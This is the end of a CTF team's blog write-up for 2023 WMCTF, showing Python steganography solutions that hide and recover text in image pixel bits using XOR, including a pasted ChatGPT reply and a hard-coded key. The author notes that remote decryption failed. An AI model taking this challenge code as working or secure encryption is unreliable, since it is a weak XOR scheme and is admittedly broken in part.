class="line">        key_bin = <span class="string">&quot;&quot;</span></span><br><span class="line">        key_length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img_array.shape[<span class="number">0</span>]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img_array.shape[<span class="number">1</span>]):</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(img_array.shape[<span class="number">2</span>]):</span><br><span class="line">                    pixel_value = img_array[i, j, k]</span><br><span class="line">                    key_bit = pixel_value &amp; <span class="number">0x01</span></span><br><span class="line">                    key_bin += <span class="built_in">str</span>(key_bit)</span><br><span class="line">                    key_length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> key_length == <span class="number">80</span>:  <span class="comment"># Assuming a maximum key length of 10 characters (8 bits * 10 = 80 bits)</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> key_length == <span class="number">80</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> key_length == <span class="number">80</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        key_chars = [<span class="built_in">chr</span>(<span class="built_in">int</span>(key_bin[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key_bin), <span class="number">8</span>)]</span><br><span class="line">        key = <span class="string">&#x27;&#x27;</span>.join(key_chars)</span><br><span class="line">        <span class="keyword">return</span> key</span><br></pre></td></tr></table></figure>

<p>没有key可以，有了key不行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, img, key</span>):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img)</span><br><span class="line">        img_array = np.array(img)</span><br><span class="line">        flat_img_array = img_array.flatten()</span><br><span class="line"></span><br><span class="line">        data_binary = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(pixel, <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> pixel <span class="keyword">in</span> flat_img_array)</span><br><span class="line">        key_binary = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> key)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key_binary) &lt; <span class="built_in">len</span>(data_binary):</span><br><span class="line">            key_binary += key_binary * ((<span class="built_in">len</span>(data_binary) // <span class="built_in">len</span>(key_binary)) + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        encrypted_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> data_bit, key_bit <span class="keyword">in</span> <span class="built_in">zip</span>(data_binary, key_binary):</span><br><span class="line">            encrypted_bit = <span class="built_in">str</span>(<span class="built_in">int</span>(data_bit) ^ <span class="built_in">int</span>(key_bit))</span><br><span class="line">            encrypted_data += encrypted_bit</span><br><span class="line">        </span><br><span class="line">        encrypted_pixels = [<span class="built_in">int</span>(encrypted_data[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_data), <span class="number">8</span>)]</span><br><span class="line">        encrypted_img_array = np.array(encrypted_pixels, dtype=np.uint8)</span><br><span class="line">        encrypted_img_array = encrypted_img_array.reshape(img_array.shape)</span><br><span class="line">        encrypted_img = Image.fromarray(encrypted_img_array)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> encrypted_img</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, img, key</span>):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img)</span><br><span class="line">        img_array = np.array(img)</span><br><span class="line">        flat_img_array = img_array.flatten()</span><br><span class="line"></span><br><span class="line">        key_binary = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> key)</span><br><span class="line"></span><br><span class="line">        extracted_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> pixel <span class="keyword">in</span> flat_img_array:</span><br><span class="line">            pixel_binary = <span class="built_in">format</span>(pixel, <span class="string">&#x27;08b&#x27;</span>)</span><br><span class="line">            extracted_bit = <span class="built_in">str</span>(<span class="built_in">int</span>(pixel_binary[-<span class="number">1</span>]) ^ <span class="built_in">int</span>(key_binary[-<span class="number">1</span>]))</span><br><span class="line">            extracted_data += extracted_bit</span><br><span class="line">            key_binary = key_binary[<span class="number">1</span>:] + extracted_bit</span><br><span class="line"></span><br><span class="line">        extracted_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(extracted_data[i:i+<span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(extracted_data), <span class="number">8</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> extracted_text</span><br></pre></td></tr></table></figure>

<p>StegLab2-ToJPGAttack 本地测了没什么问题，能够加解密，服务器远程加密成功，解密寄了</p>
<p>GPT:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">抱歉，我之前的回复没有写完。下面是如何使用PIL、numpy和异或加密将文本信息加密到图像中，并从加密图像中解密文本信息的完整代码：</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_crypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([data[i] ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_image</span>(<span class="params">img, msg, key</span>):</span><br><span class="line">    data = np.array(img)</span><br><span class="line">    encrypted_msg = xor_crypt(msg.encode(), key)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(encrypted_msg) * <span class="number">8</span> &gt; data.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Message is too long to encode in image&quot;</span>)</span><br><span class="line">    bin_msg = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">format</span>(i, <span class="string">&quot;08b&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> encrypted_msg])</span><br><span class="line">    data = data.flatten()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bin_msg)):</span><br><span class="line">        data[i] = data[i] &amp; ~<span class="number">1</span> | <span class="built_in">int</span>(bin_msg[i])</span><br><span class="line">    <span class="keyword">return</span> Image.fromarray(data.reshape(img.size[<span class="number">1</span>], img.size[<span class="number">0</span>], <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_image</span>(<span class="params">img, key</span>):</span><br><span class="line">    data = np.array(img)</span><br><span class="line">    data = data.flatten()</span><br><span class="line">    bin_msg = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(data[i] &amp; <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size)])</span><br><span class="line">    encrypted_msg = <span class="built_in">int</span>(bin_msg, <span class="number">2</span>).to_bytes(<span class="built_in">len</span>(bin_msg) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> xor_crypt(encrypted_msg, key).decode()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;mysecretpassword&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;image.png&quot;</span>)</span><br><span class="line">encoded_img = encode_image(img, <span class="string">&quot;Hello, World!&quot;</span>, key)</span><br><span class="line">encoded_img.save(<span class="string">&quot;encoded_image.png&quot;</span>)</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;encoded_image.png&quot;</span>)</span><br><span class="line">msg = decode_image(img, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded message:&quot;</span>, msg)</span><br><span class="line"></span><br><span class="line">上面的代码定义了三个函数：xor_crypt、encode_image和decode_image。xor_crypt函数接受一个要加密/解密的数据和一个用于异或加密的密钥作为输入，并返回加密/解密后的数据。encode_image函数接受一个PIL图像对象、一个要加密的文本消息和一个用于异或加密的密钥作为输入，并返回一个加密后的PIL图像对象。decode_image函数接受一个加密的PIL图像对象和一个用于异或解密的密钥作为输入，并返回解密后的文本信息。</span><br><span class="line">希望这些信息对您有所帮助！如果您有其他问题，请随时告诉我。😊</span><br></pre></td></tr></table></figure>

<p>加密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor_crypt</span>(<span class="params">self, data, key</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([data[i] ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, img, key</span>):</span><br><span class="line">        <span class="comment"># img, msg, key</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img)</span><br><span class="line">        data = np.array(img)</span><br><span class="line">        msg = key</span><br><span class="line">        key = <span class="string">b&quot;mysecretpassword&quot;</span></span><br><span class="line"></span><br><span class="line">        encrypted_msg = <span class="variable language_">self</span>.xor_crypt(msg.encode(), key)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(encrypted_msg) * <span class="number">8</span> &gt; data.size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Message is too long to encode in image&quot;</span>)</span><br><span class="line">        bin_msg = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">format</span>(i, <span class="string">&quot;08b&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> encrypted_msg])</span><br><span class="line">        data = data.flatten()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bin_msg)):</span><br><span class="line">            data[i] = data[i] &amp; ~<span class="number">1</span> | <span class="built_in">int</span>(bin_msg[i])</span><br><span class="line">        <span class="keyword">return</span> Image.fromarray(data.reshape(img.size[<span class="number">1</span>], img.size[<span class="number">0</span>], <span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p>解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor_crypt</span>(<span class="params">self, data, key</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([data[i] ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self,img</span>)-&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># def decode_image(img, key):</span></span><br><span class="line">        key = <span class="string">b&quot;mysecretpassword&quot;</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img)</span><br><span class="line">        data = np.array(img)</span><br><span class="line">        data = data.flatten()</span><br><span class="line">        bin_msg = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(data[i] &amp; <span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data.size)])</span><br><span class="line">        encrypted_msg = <span class="built_in">int</span>(bin_msg, <span class="number">2</span>).to_bytes(<span class="built_in">len</span>(bin_msg) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        d = <span class="variable language_">self</span>.xor_crypt(encrypted_msg, key)</span><br><span class="line">        <span class="comment"># print(d[:20])</span></span><br><span class="line">        <span class="keyword">return</span> d.decode()</span><br></pre></td></tr></table></figure></div><div class="article-licensing box"><div class="licensing-title"><p>2023 WMCTF SU Write-Up</p><p><a href="https://team-su.github.io/2023/08/19/2023-08-19Wmctf/">https://team-su.github.io/2023/08/19/2023-08-19Wmctf/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2023-08-19</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-03</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/WMCTF/">WMCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/08/24/2023-05-17gyb/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2023 贵阳大数据网络安全精英对抗赛 SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/07/17/2023-07-15zer0ptsCTF/"><span class="level-item">2023 Zer0ptsCTF SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1</span><span class="level-item">Web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">ezblog</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">ezblog2</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">AnyFileRead</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">ez_java_agagin</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">你的权限放着我来</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2</span><span class="level-item">Pwn</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">Blindless</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">Jit</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3</span><span class="level-item">Re</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">ezAndroid</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">RightBack</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4</span><span class="level-item">Cry</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">signin</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">welcomesigner2</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">welcomesigner1</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">badprime</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5</span><span class="level-item">Misc</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">Oversharing</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">FindMe</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">Fantastic_terminal</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">6</span><span class="level-item">Blockchain</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">babyblock</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">7</span><span class="level-item">Steg</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">7.1</span><span class="level-item">EZ_v1deo</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">7.2</span><span class="level-item">StegLab1</span></span></a></li></ul></li></ul></div></div><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>